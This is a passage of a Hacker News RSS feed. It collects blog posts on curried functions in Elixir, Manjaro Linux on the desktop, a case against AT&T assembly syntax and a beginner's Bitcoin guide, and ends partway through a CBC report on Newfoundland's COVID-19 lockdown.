iex&gt; Macro.to_string({{:., [], [{:fun, [], nil}]}, [], params})
"fun.(arg1, arg2)"
</code></pre>
<h2>Evaluating the AST</h2>
<p>We now know how to generate the AST for our curried function. For the next step, we need to figure out how to use it!</p>
<p>If you're scared of <a href="https://hexdocs.pm/elixir/Kernel.html#defmacro/2"><code>defmacro/2</code></a> and <a href="https://hexdocs.pm/elixir/Kernel.SpecialForms.html#unquote/1"><code>unquote/1</code></a>, don't worry. We don't need any of that. Everyone knows macros are scary.</p>
<p>You know what's not scary? <em>Runtime evaluation!</em></p>
<p>With <a href="https://hexdocs.pm/elixir/Code.html#eval_quoted/3"><code>Code.eval_quoted/2</code></a>, we should finally be able to write our <code>curry</code> function:</p>
<pre><code>defmodule Func do
  def curry(fun) do
    {:arity, arity} = Function.info(fun, :arity)
    params = Macro.generate_unique_arguments(arity, nil)
    body_ast = {{:., [], [{:fun, [], nil}]}, [], params}

    {curried_fun, _} =
      params
      |&gt; Enum.reverse()
      |&gt; Enum.reduce(body_ast, fn arg, acc -&gt;
        {:fn, [], [{:-&gt;, [], [[arg], acc]}]}
      end)
      |&gt; Code.eval_quoted(fun: fun)

    curried_fun
  end
end
</code></pre>
<p>Does it work?</p>
<pre><code>iex&gt; curried_sum = Func.curry(fn x, y -&gt; x + y end)
#Function&lt;...&gt;
iex&gt; curried_sum.(1).(2)
3
iex&gt; Func.curry(&amp;Map.get/2).(%{foo: "bar"}).(:foo)
"bar"
</code></pre>
<p>It does! 🎉
Who needs macros??</p>

    </article></div>]]>
            </description>
            <link>https://liftm.io/posts/cursed-curried-elixir.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124431</guid>
            <pubDate>Sat, 13 Feb 2021 16:16:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The state of Linux on desktop in 2020]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26123746">thread link</a>) | @tuananh
<br/>
February 13, 2021 | https://tuananh.net/2021/02/13/the-state-of-linux-on-desktop/ | <a href="https://web.archive.org/web/*/https://tuananh.net/2021/02/13/the-state-of-linux-on-desktop/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>I got fed up with macOS. While the new hardware(Apple Silicon) got amazing feedbacks, the OS itself
is so lag behind.</p>

<p>I got a Windows 10 desktop at home and heck, it was event much more pleasant to use than using macOS.</p>

<ul>
  <li>As a typical user (web browsing, mail and office stuff), Windows 10 is very good.</li>
  <li>As a developer, it’s getting a lot better with WSL/Microsoft Terminal/etc…</li>
</ul>

<p>I decided to give Linux another evaluation test. I pick Manjaro - an Arch-based over an Ubuntu-based 
distro this time after hearing all kind of praise from its users. But I also don’t want to configure
everything I need to use, hence Manjaro.</p>

<blockquote>
  <p>Manjaro is a user-friendly Linux distribution based on the independently developed Arch operating 
system. Within the Linux community, Arch itself is renowned for being an exceptionally fast, 
powerful, and lightweight distribution that provides access to the very latest cutting edge - and 
bleeding edge - software. However, Arch is also aimed at more experienced or technically-minded 
users. As such, it is generally considered to be beyond the reach of those who lack the technical 
expertise (or persistence) required to use it.</p>

  <p>via <a href="https://wiki.manjaro.org/index.php/About_Manjaro">wiki.manjaro.org</a></p>
</blockquote>

<p>So looks like it got the best of both worlds right?</p>

<h2 id="the-test-setup">The test setup</h2>

<p>I built a new mini PC recently. It’s the Asrock Deskmini X300W that use AMD processor. If you prefer
Intel, you can choose the Intel version of the box.</p>

<p>I went with AMD because I like their Zen offering and I would love to support them.</p>

<p>I just throw a 6 cores AMD 4650G processor, 32GB of 3200Mhz Crucial memory, 512GB Samsung NVME drive for 
OS and other stuff plus another 1TB 2.5’ SSD for storage.</p>

<p>For OS, I went with Manjaro KDE variant because I like the look of it.</p>

<h2 id="the-experience">The experience</h2>

<p>Almost everything works out of the box.</p>

<ul>
  <li>
    <p>The graphic works right. I do not have an Intel GPU so it’s much easier for me but I hear 
terrifying stories from other side of the world.</p>
  </li>
  <li>
    <p>WiFi works. Zero complaints here.</p>
  </li>
  <li>
    <p>The bluetooth is almost ok. Most stuff I throw at it works, except an old Xbox One controller of
mine. The one came with Xbox One S works with 1 minor additional step (disable ERTM). I tested with
4 bluetooth mouses, 2 keyboards, 1 speaker and 2 Xbox controllers.</p>
  </li>
  <li>
    <p>Since I pick KDE, it’s a bit troublesome to use setup i3 wm. After reading several tutorials, I 
decided not to bother with one. Instead, I settled with 
<a href="https://github.com/esjeon/krohnkite">krohnkite</a> plugin for KWin. It works really well for my needs
, given that my needs are pretty basic.</p>
  </li>
  <li>
    <p>I do gaming once in awhile and Manjaro even came bundled with Steam (LOL). One might say it’s so
bloat but I’m ok. Storage is cheap these days.</p>
  </li>
  <li>
    <p>Developer experience is awesome. Linux is usually first-class platform for open source projects.
Everything just works. Docker is so fast because no VM required. It’s the best platform for 
developers, hands down.</p>
  </li>
</ul>

<h2 id="conclusion">Conclusion</h2>

<p>So far, I’m loving it. It does everything I need and works with all the peripherals I have, 
with the exception of the Xbox One controller (wired connection still work though). I’m gonna stick with
Manjaro for now. I don’t see myself moving to Arch since my love for tweaking the system is long
gone. I just want something that works and Manjaro does work very well for me.</p>

  </div></div>]]>
            </description>
            <link>https://tuananh.net/2021/02/13/the-state-of-linux-on-desktop/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26123746</guid>
            <pubDate>Sat, 13 Feb 2021 14:24:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Create YouTube playlists without an account (savable as url)]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26123256">thread link</a>) | @nevernothing
<br/>
February 13, 2021 | https://playlists.at/youtube/ | <a href="https://web.archive.org/web/*/https://playlists.at/youtube/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://playlists.at/youtube/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26123256</guid>
            <pubDate>Sat, 13 Feb 2021 12:34:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why no one should use AT&T syntax ever, for any reason, under any circumstances]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26122532">thread link</a>) | @moonchild
<br/>
February 13, 2021 | https://elronnd.net/writ/2021-02-13_att-asm.html | <a href="https://web.archive.org/web/*/https://elronnd.net/writ/2021-02-13_att-asm.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<em>2021-02-13</em><br>

<h2 id="baggins">Background</h2>

<p>
In the beginning, the CPU was created.
This has made a lot of people very angry and has been widely regarded as a bad move.

</p><p>
Though computers have only gained in popularity, in our interactions with them we have increasingly attempted to interact less with the CPU; and more and more with the abstractions that simply <i>happen</i> to be implemented atop CPUs.
One of the earliest such abstractions was the <b>instruction set architecture</b> (ISA).
The idea was this: instead of writing code for a specific CPU, you would design an abstract specification for one; a language, if you will, that could be spoken by multiple different CPUs.
You would then write code according to that instruction set, in that language, and it could be interpreted by any CPU implementing that instruction set.
This was desirable partly because it allowed code to be written once and run multiple placesâ€”the first inklings of portability, rising!â€”but mostly because it allowed you to think only of the specification while you wrote your code, and perhaps even forget for a moment that there was a CPU underlying it all.

</p><p>Ahhh, the power of abstraction in the morning...

</p><p>
Another such abstraction was the <b>mnemonic assembler</b>.
Before the assembler was created, CPUs and ISAs were instructed using numbers which had special meaning to the ISA in question.
For example, consider the following number<sup id="b0"><a href="#f0">0</a></sup> (in octal form, for no particular reason):

</p><pre>030514</pre>

<p>
In the context of the ISA implemented by the CRAY-1<sup id="b1"><a href="#f1">1</a></sup>, that number is understand to mean â€˜add the contents of registers A1 and A4, and store the result in register A5â€™.
The association between this numeric form and its meaning under the ISA is completely arbitrary, and serves only to remind our poor programmers that they are serving a CPU, whose native language is written with arbitrary numbers.
Wouldnâ€™t it be nice if, instead of meaningless <span>030514</span>, our CPU could understand a form like this one?

</p><pre>A5	A1+A4
</pre>

<p>
(This latter form, while no less arbitrary than the other, is arbitrary in a way which matches preexisting human arbitrarinesses.
 This makes humans feel warm and fuzzy inside, like theyâ€™ve conquered a part of the machine kingdom with their superior human intellect, and is called a â€˜mnemonicâ€™.)

</p><p>
Unfortunately, while CPUs are equally capable of parsing numbers like <span>030514</span> and strings of words like <span>A5	A1+A4</span>, they are much slower at the second.
Thus, a compromise was borne: a mnemonic assembler would be a program (like all programs, it would run on a CPU implementing an ISA), and it would translate mnemonic forms like <span>A5	A1+A4</span> into machine forms like <span>030514</span>.
This allows humans to <i>pretend</i> that the CPUs understand their own native language, while still allowing the CPUs themselves to run at tolerable speeds.

</p><p>
At this point, it is worth making a couple of things devastatingly clear.

</p><p>
First, an assembler that runs on a given ISA may produce machine code for that ISA, or machine code for a completely different ISA.<!--(An assembler that produces code for a different ISA than that on which is runs is sometimes called a â€˜cross assemblerâ€™, Ã  la â€˜cross compilerâ€™.)-->
</p><p>
Second, there is almost always a 1:1 correspondence between the mnemonics inhaled by a given assembler and the instructions it spits out.  (Where there is not, the situation is generally close enough to 1:1 as to make no ends.)
</p><p>
Third, mnemonics were not standardised the same way that ISAs were.  A given set of mnemonics only works on one ISA, but there might be any number of other mnemonic-sets that also work on that ISA.  (Despite this, a number of tropes tend emerge which are shared by all mnemonic-sets targeting a given ISA.)

</p><p>
At this point, we are ready to attack the problem at hand.
</p><p>
There is a popular group of ISAs variably known as:
</p><ul>
<li>x86
 <ul><li>x86-64?
  <ul><li>EM64T?
   <ul><li>x64??
    <ul><li>AMD64???</li>
    </ul></li>
   </ul></li>
  </ul></li>
 </ul></li>
<li>IA-32
 <ul><li>IA-32<b>e</b>???</li></ul></li>
</ul>
(The question marks have been added for comedic effect.
 In point of fact, they are about as funny as the overproliferation of names that this ISA seems to accumulate in much the same way that a pile of cow dung accumulates flies or that this sentence accumulates words.
 Unlike a pile of cow dung, however, no clarity emerges when you swat it; only more confusion.
 Which being said, you should still clean your CPU at least annually; use soap, warm water, and a soft rag to get the gunk out of the transistors.)

<p>
This ill-fated ISA, which has almost as many addressing forms as names and is so immensely complicated that a you need to read a 5000-page tome<sup id="b2"><a href="#f2">2</a></sup> plus an additional 400 or so pages of unofficial reference before you can even begin to be qualified to understand the consequences of a single of its instructions, will henceforth be referred to as â€˜â€œSIBâ€�â€™.
I give it that name not so much to deliberately sow confusion (though that is definitely a contributing factor) as because thatâ€™s the only name that everybody seems to agree is associated with it.
(This is also the reason its name is quoted: itâ€™s the only word, indeed the only idea in this missive I didnâ€™t make up from whole cloth, ripped cloth, cheese cloth, pins, pinheads, camembert<sup id="b3"><a href="#f3">3</a></sup>, angels, and heads of ã�®ã�£ã�ºã‚‰ã�¼ã�†.)

</p><p>
Because â€˜SIBâ€™ is, inexplicably, enduringly popular, a lot of assemblers have been made for it.
As I mentioned, though different assemblers are not always compatible with each other, tropes and commonalities tend to emerge.
In fact, there are two incompatible sets of tropes; they are generally called â€˜AT&amp;T syntaxâ€™ and â€˜Intel syntaxâ€™, and you can read about the differences <a href="https://en.wikipedia.org/wiki/X86_assembly_language#Syntax">here</a>.

</p><p>
...but you knew all of this already.
If Iâ€™ve done my due diligence, you were incited by the title but are still looking for something to disagree (or agree) with strongly.
Patience!

</p><p>
I contend that the AT&amp;T syntax is harmful and bad, and should never be used, for any reason, under any circumstances, by anyone.
Hereâ€™s why:


</p><h2 id="the-real-biggy">AT&amp;T syntax is broken</h2>

<p>
This is the single greatest sin perpetrated by the AT&amp;T syntax.
If not for this, it would be sufficient to say that Intel syntax were superior.
If not for this, the use of AT&amp;T syntax would be at least be acceptable, at least be moral<sup id="b4"><a href="#f4">4</a></sup>, even if still in supremely poor taste.
If not for this, it would be <i>possible</i> to write correct programs using the AT&amp;T syntax.

</p><p>
Now, to be clear, I donâ€™t expect advanced safety features from an assembler.
I donâ€™t expect dependent types, or linear types, or even any types at all.
<i>But I would pretty damn well appreciate it if my assembler didnâ€™t <b>actively</b> try to sabotage me!</i>


</p><p>
Let me show you an example.
Hereâ€™s an annotated snippet of Intel-style â€˜SIBâ€™ assembly:

</p><pre>mov	eax, 28            ; (1) store the immediate value 28 in the EAX register
mov	eax, dword [28]    ; (2) load one â€˜dwordâ€™ (4 bytes) from memory location 28 and store it in the EAX register <!--;     (on some assemblers, â€˜dwordâ€™ should be replaced with â€˜dword ptrâ€™, or just elided entirely)-->
</pre>

<p>
Hereâ€™s another snippet, AT&amp;T syntax this time:

</p><pre>movl	$28, %eax          ; (1) store the immediate value 28 in the EAX register
movl	(28), %eax         ; (2) load one â€˜(l)ongâ€™ (4 bytes) from memory location 28 and store it in the EAX register <!--;     (on some assemblers, the â€˜lâ€™ can be elided)-->
</pre>

<p>
Good so far?
Reasonable?
Good.

</p><p>
I present to you two more candidates, again in AT&amp;T syntax:

</p><pre>movl	28, %eax           ; (3) ???
movl	($28), %eax        ; (4) ???
</pre>

<p>
Before you continue reading, I want you to imagine what it would make <i>sense</i> for those instructions to mean.
Should they even be correct?
If you happen to already know, try to forget (pray for oblivion from the horror...)

</p><p>
If you donâ€™t know, make your best guess.

</p><p>
Ready?
Here they are again, with annotations this time:

</p><pre>movl	28, %eax           ; (3) same as (2)
movl	($28), %eax        ; (4) load one long from the memory location indicated by global symbol â€˜$28â€™ and store it in the EAX register
</pre>

<p>
Wait, what?

</p><p>
Go back and read that again and tell me in what world that could possibly be okay.
Tell me in what world an assembler that silently accepts the above forms, that is almost certainly corrupting your meaning in a way you donâ€™t intend, could <i>possibly</i> produce correct code.
Tell me you would <i>never</i> forget to put a <span>$</span> in front of an immediate, and that you would never accidentally put one in a displacement.

</p><p>
This doesnâ€™t even have anything to do with Intel syntax.
This isnâ€™t a win for Intel over AT&amp;T.
This is just AT&amp;T syntax being straight-up batshit fucking bonkers for no very good reason.

</p><p>
All it would take to redeem AT&amp;T syntaxâ€”okay, maybe not redeem, but at least elevate from <i>Cocytus</i> to <i>Phlegyas</i>â€”would be to make syntaxes (3) and (4) illegal.
Thatâ€™s it.
Want to help?
Send a patch to your local AT&amp;T-style assembler to make it warn for both of those forms.
Give it a command-line flag to err instead of warning.


</p><h2>AT&amp;T is backwards</h2>

<p>
Having eaten the proverbial elephant, it is time to start addressing the smaller fry.<br>
Smaller fry: you have done an admirable job of being a thorn in my side.<br>
Reader: following are reasons why the AT&amp;T operand order is backwards.

</p><p>
Iâ€™m sure youâ€™re familiar with the issue, but hereâ€™s a quick refresher.
Intel first:

</p><pre>mov	eax, ebx           ; (1) load one dword from the EBX register and store it in the EAX register
add	eax, ebx           ; (2) load a dword each from the EAX and EBX registers, add them together, and store the result (truncated to a dword) in the EAX register
</pre>

<p>
AT&amp;T:

</p><pre>mov	%ebx, %eax         ; (1) load one dword from the EBX register and store it in the EAX register
add	%ebx, %eax         ; (2) load a dword each from the EAX and EBX registers, add them together, and store the result (truncated to a dword) in the EAX register
</pre>

<p>
In general, Intel instruction mnemonics take the form â€˜&lt;op&gt; &lt;destination&gt;, &lt;source&gt;â€™, where AT&amp;T uses â€˜&lt;op&gt; &lt;source&gt;, &lt;destination&gt;â€™.

</p><p>
Before continuing, I want to establish a couple of things.

</p><p>
First, the consistency argument is bunk.
The consistency argument in favour of Intel syntax is illustrated by the following example:

</p><blockquote>Putting the destination first is more consistent with other, higher-level languages like C.
<span>mov eax, ebx</span> is analogous to <span>eax = ebc</span>, and <span>add eax, ebx</span> to <span>eax += ebx</span>; in general, <span>op x, y</span> is analogous to <span>x op= y</span>.</blockquote>
This is …</div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://elronnd.net/writ/2021-02-13_att-asm.html">https://elronnd.net/writ/2021-02-13_att-asm.html</a></em></p>]]>
            </description>
            <link>https://elronnd.net/writ/2021-02-13_att-asm.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26122532</guid>
            <pubDate>Sat, 13 Feb 2021 09:38:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Beginner’s Guide to Getting Started with Bitcoin]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 82 (<a href="https://news.ycombinator.com/item?id=26122394">thread link</a>) | @onerom
<br/>
February 13, 2021 | https://serhack.me/articles/getting-started-with-bitcoin/ | <a href="https://web.archive.org/web/*/https://serhack.me/articles/getting-started-with-bitcoin/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img src="https://serhack.me/images/bitcoin-getting-started/social_oasis.jpg"><figcaption><h4>A man looks for Bitcoin Oasis</h4></figcaption></figure><p>If you have heard about blockchain or cryptocurrency, then the term that initially comes to mind is <a href="https://bitcoin.org/">Bitcoin</a>. Launched 12 years ago, it was the late 2017 bull run that created a media frenzy that propelled Bitcoin into the mainstream and our modern day lexicon.</p><p>Often labeled as the “original” cryptocurrency, <a href="https://bitcoin.org/">Bitcoin</a> has been the catalyst (directly and/or indirectly) behind many new innovations in the blockchain and digital asset space, most notably <a href="https://ethereum.org/">Ethereum</a> and <a href="https://getmonero.org/">Monero</a>. Shortly after the late 2017 bull run lost its steam, interest in these new technologies started to fade ― but here we are in 2021 with Bitcoin having risen like a phoenix from the ashes. As you would assume, an appetite for the blockchain and digital asset space has returned and now it is more important than ever that we understand what exactly is behind this unique asset, Bitcoin.</p><p>This article is meant to be a guide for individuals who are new to cryptocurrency and want to learn about <a href="https://bitcoin.org/">Bitcoin</a>, specifically its use case and the different ways to become involved in the broader blockchain and digital asset space. My goal is to educate you on the basics and make sure that you walk away with a newfound perspective and understanding of <a href="https://bitcoin.org/">Bitcoin</a>.</p><h2 id="what-is-bitcoin">What is Bitcoin?</h2><p>Bitcoin is a peer-to-peer version of electronic cash whose transactions are recorded in a public distributed ledger called a blockchain. In late October 2008, Satoshi Nakamoto (whose identity is still unknown) published a white paper titled <a href="https://bitcoin.org/bitcoin.pdf"><em>Bitcoin: A Peer-to-Peer Electronic Cash System</em></a> on bitcoin.org (registered in August 2008) and subsequently posted it to <a href="https://www.metzdowd.com/pipermail/cryptography/2008-October/014810.html">a cryptography mailing list</a>. On January 3, 2009, the Bitcoin network was created when Satoshi Nakamoto mined the initial block of the chain, which is called the genesis block.</p><p>In essence, Bitcoin is a decentralized type of “digital money” that can be used by anyone around the world, at any time, and without restrictions or a central authority. Bitcoin is not backed by any bank or government and originally allowed users to freely send and/or spend it anywhere without trusting third parties.</p><p>At inception, the price of Bitcoin was approximately $0.01 and, as of today, the price has surpassed $40,000 per coin ― with many believing that it can grow exponentially higher to levels between $100,000 and $250,000 in the next year or so.</p><figure><img src="https://serhack.me/images/bitcoin-getting-started/extras_1_blockchain-80.jpg"><figcaption><h4>The transactions data are memorized through a chain-of-blocks</h4></figcaption></figure><p>Given that Bitcoin exists and operates within the confounds of the Internet, all user balances are kept on an immutable and fully transparent blockchain. Put simply, each Bitcoin transaction is broadcasted to the Bitcoin network and grouped with several other transactions in the form of a block, which the network’s miners validate. Once the block is accepted, the transactions get recorded on the blockchain (which, as you may recall, is a public ledger). Whenever this process is successfully completed, the network distributes new Bitcoin to miners for each block that has been validated ― this is referred to as a block reward.</p><p>The peculiarity of the blockchain is its distribution and decentralized properties, as all the nodes share a valid copy of the public ledger. In the Bitcoin network, nodes play a very important role ― think of them as “protectors” who are constantly monitoring Bitcoin’s blockchain to distinguish legitimate Bitcoin transactions from illegitimate ones. The basic job of a node is to prevent attempts to double-spend Bitcoins that have already been spent elsewhere. In addition, the process of mining is essential to validating transactions, as it ensures the overall trustworthiness and security of the payment network.</p><h2 id="advantages-and-limitations">Advantages and Limitations</h2><p>Members of the cryptocurrency community, who range from the tech savvy to your average retail investor, have adopted various perspectives regarding the fundamental driver of Bitcoin’s value (both in financial and non-financial terms).</p><p>On one side, there are the Bitcoin Maximalists who believe that Bitcoin is the ultimate financial innovation and will assume a mainstream role in global society ― to maximalists, other cryptocurrencies and traditional financial instruments are inferior. On the other side, you have cryptocurrency enthusiasts who believe Bitcoin’s technology is outdated and that other cryptocurrencies, such as Ethereum, have more expansive utility.</p><p>These arguments and differences of opinion (as it relates to Bitcoin) can often become confusing, so let’s dig deeper into some of the most common discussion points with hopes that you can decipher for yourself.</p><h3 id="advantages">Advantages</h3><ul><li>A blockchain is managed autonomously using <strong>a peer-to-peer network</strong> and cannot be shut down ― the only way to stop it is through shutting down or banning Internet access. (Note: Even though a blockchain or Bitcoin cannot be shut down, some jurisdictions have imposed restrictions on citizens that limit or ban the holding or trading of Bitcoin and/or other cryptocurrencies.)</li><li>There is no need to trust a third party. <strong>You are your own bank!</strong></li><li>Relatively quick and cheap transactions without intermediary fees (around 10 minutes on average per transaction), when compared to most leading cryptocurrencies.</li><li>Increasing adoption by merchants and individuals across the globe.</li><li>Largest market capitalization and name recognition, which will continue to promote its growth and (hopefully) price stability.</li></ul><h3 id="limitations">Limitations</h3><ul><li><strong>Lack of anonymity</strong> as transactions that take place in the Bitcoin network, along with many other leading cryptocurrencies, are fully transparent and can potentially be linked via chain analysis. In addition, strict AML/KYC regulations require many of the leading cryptocurrency trading exchanges to verify your most sensitive personal information.</li><li>Slow and expensive transactions, when compared to lesser known cryptocurrencies that can be sent within seconds and at a fraction of the cost.</li><li>Irreversible transactions. Once a transaction is sent, you cannot undo or cancel the transaction.</li><li>Achievement of its status as a currency will be challenging due to its volatile nature (i.e. swings in price) and regulations.</li><li>The core technology has some subtle limits that make Bitcoin outdated in comparison with other cryptocurrencies.</li></ul><p>Along with Bitcoin Maximalists and cryptocurrency enthusiasts, you have many individuals who simply like to be long-term holders of Bitcoin (because they believe in the fundamentals and value proposition) and others who speculate on the short-term price (e.g. day traders).</p><p>Whatever side you are on, there is no question that Bitcoin has established itself as a serious contender in the financial world and is here to stay for the time being. There may be other alternatives, but the granddaddy of cryptocurrencies still has the spotlight!</p><h2 id="how-to-obtain-bitcoin-from-an-exchange">How to Obtain Bitcoin from an Exchange</h2><p>Now that you have an understanding of Bitcoin and its utility, you may be interested in purchasing some. If that is the case, you have come to the right place as buying it is now easier than ever due to the growing number of exchanges and companies making Bitcoin accessible to the masses.</p><p>Some of the most well-known exchanges that allow you to purchase Bitcoin and other cryptocurrencies are <a href="https://coinbase.com/">Coinbase</a>, <a href="https://www.gemini.com/">Gemini</a>, <a href="https://www.kraken.com/">Kraken</a>, <a href="https://binance.com/">Binance</a>, and <a href="https://www.huobi.com/en-us/">Huobi</a>. While all of these exchanges list Bitcoin, not all of them offer the same cryptocurrencies ― so, it is recommended to open accounts across a few exchanges to ensure that you are provided adequate exposure.</p><p>Once you have created an account on an exchange, you can transfer your local fiat money via ACH or bank wire to the exchange. From there, you can purchase Bitcoin or another cryptocurrency in exchange for your local fiat money. In addition, after purchasing Bitcoin, you can exchange it for another cryptocurrency that you might not be able to purchase with your local fiat money. While some exchanges offer credit card purchases of Bitcoin, please keep in mind that the fees associated with this transaction are typically very high.</p><figure><img src="https://serhack.me/images/bitcoin-getting-started/extras_2_exchange-80.jpg"><figcaption><h4>You can exchange central currencies (EUR, USD) to BTC, but sacrificing privacy.</h4></figcaption></figure><p>Using any of the exchanges listed above is the easiest and most convenient way to purchase Bitcoin, as the majority of the other cryptocurrency exchanges do not support fiat currencies. This being the case, you can only exchange other cryptocurrencies (like Ethereum or Monero) for Bitcoin. <a href="https://cash.app/">Cash App</a> and <a href="https://www.paypal.com/us/webapps/mpp/crypto">PayPal</a>, some of the largest financial technology companies, offer its users the ability to purchase Bitcoin. While this is extremely convenient for users of these platforms, the downside for PayPal (not Cash App) is that your Bitcoin must remain on its platform, so you cannot transfer or send it. Remember: Not your keys, not your coins.</p><p>If you are not keen on using any of the methods described above, Bitcoin ATMs are a great alternative. There are over 14,000 physical ATMs worldwide, most of which can be found in major cities at peculiar locations such as a shopping mall, burger restaurant, or a bar. All you need to do is deposit cash and enter your Bitcoin address. Once you have completed the transaction, the funds will be sent to you. This is a very simple process and typically does not require any identity verification, but beware of high fees!</p><h2 id="who-accepts-bitcoin">Who Accepts Bitcoin?</h2><p>Over the years, many individuals and businesses have begun accepting Bitcoin as a form of payment. From time to time, you might have noticed stickers on a shop’s window that says “Bitcoin accepted here.” As mentioned above, after the bull run of late 2017 died down, overall interest in cryptocurrencies (especially Bitcoin) amongst merchants began to wane. Today, Bitcoin and the broader digital asset space has bounced back from a pricing perspective and, with this, so has the interest amongst merchants who have triggered another wave of increased acceptance, most notably <a href="https://apnews.com/article/financial-markets-elon-musk-bitcoin-061817c6795e75d1c3c9e9d6cfc4a911">Tesla</a> disclosing that it has invested approximately $1.5 billion into Bitcoin and that the company plans to accept Bitcoin as payment for its electric vehicles.</p><p>There have been a few prominent …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://serhack.me/articles/getting-started-with-bitcoin/">https://serhack.me/articles/getting-started-with-bitcoin/</a></em></p>]]>
            </description>
            <link>https://serhack.me/articles/getting-started-with-bitcoin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26122394</guid>
            <pubDate>Sat, 13 Feb 2021 09:02:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Coronavirus variant puts Newfoundland back in lockdown]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26121658">thread link</a>) | @graeme
<br/>
February 12, 2021 | https://www.cbc.ca/news/canada/newfoundland-labrador/newfoundland-labrador-election-lockdown-1.5913042 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/newfoundland-labrador/newfoundland-labrador-election-lockdown-1.5913042">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Newfoundland and Labrador is under full lockdown and Saturday's provincial election will continue with only mail-in voting, officials said Friday, as the province battles the B117 variant of the coronavirus.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5843708.1608137338!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/janice-fitzgerald-dr-jatin-morkar-covid-vaccine.jpg"></p></div><figcaption>Newfoundland and Labrador's chief medical officer of health, Dr. Janice Fitzgerald, has returned the province to lockdown as an outbreak of variant B117 snowballs.<!-- --> <!-- -->(Patrick Butler/Radio-Canada)</figcaption></figure><div><h2><span>Latest</span></h2><ul><li><span>Elections NL cancels in-person voting set for tomorrow, extends special ballot deadline </span></li><li><span>Province-wide lockdown issued, reverting to strict rules last seen in May 2020</span></li><li><span>Top doctor confirms outbreak caused by UK coronavirus variant, B117</span></li><li><span>Newfoundland and Labrador adds 269 active infections in 5 days</span></li></ul></div><p><span><p>Newfoundland and Labrador is under lockdown, and Saturday's provincial election will continue with only mail-in voting, officials said Friday, as the province battles the B117 variant of the coronavirus.</p>  <p>In an emergency briefing&nbsp;Friday evening —&nbsp;the second time officials addressed the province in one day —&nbsp;Dr. Janice Fitzgerald, the chief medical officer of health, said tests had confirmed the&nbsp;widespread presence of B117&nbsp; for the first time.</p>  <p>The "variant of concern" is responsible for this week's mass outbreak in the capital.</p>  <p>Confirmation of the variant's arrival prompted lockdown&nbsp;measures across the province Friday and has suspended in-person voting in the election, delaying the ballot count&nbsp;by at least two weeks.&nbsp;</p>  <p>B117 was first discovered in the United Kingdom. It's believed to be more contagious than the original coronavirus strain.</p>  <p>"We know that if not controlled, it becomes a predominant strain within weeks of first appearance," Fitzgerald said. "This is concerning and serious. But we have the ability to overcome it."</p>  <p>Effective immediately, the entire province is at Alert Level 5, with all but essential businesses closed, Fitzgerald announced.</p>  <p>The decision expands&nbsp;previous measures implemented in the St. John's area this week, returning Newfoundland and Labrador to the same rules it followed for weeks last spring.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/covid-testing-mundy-pond-blizzard.jpg 300w,https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/covid-testing-mundy-pond-blizzard.jpg 460w,https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/covid-testing-mundy-pond-blizzard.jpg 620w,https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/covid-testing-mundy-pond-blizzard.jpg 780w,https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/covid-testing-mundy-pond-blizzard.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/covid-testing-mundy-pond-blizzard.jpg"></p></div><figcaption>COVID-19 testing has spiked this week as Newfoundland and Labrador reports record daily cases.<!-- --> <!-- -->(Submitted by Lisa Warren)</figcaption></figure></span></p>  <p>Nine more cases have been added to the active total since the afternoon briefing, Fitzgerald said. Many of them are teenagers with mild or no symptoms.</p>  <p>There are now 269&nbsp;active cases in the province, with 253&nbsp;of them reported in the past five days.&nbsp;</p>  <p>The outbreak has come as a rude awakening for a province that regularly reported active total caseloads in the single digits, and over the summer survived a 42-day stretch without a single active infection.</p>  <p><em><strong>WATCH | Newfoundland and Labrador moves swiftly into lockdown:&nbsp;</strong></em></p>  <p><span><span><div><div title="Newfoundland and Labrador sees spike in COVID-19 cases" role="button" tabindex="0"><div><div aria-labelledby="1860314691986-metadata-" title="Newfoundland and Labrador sees spike in COVID-19 cases"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/567/351/COVID-NL-CASES-ELEX-YATES-120221.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>Newfoundland and Labrador reported Friday that it is 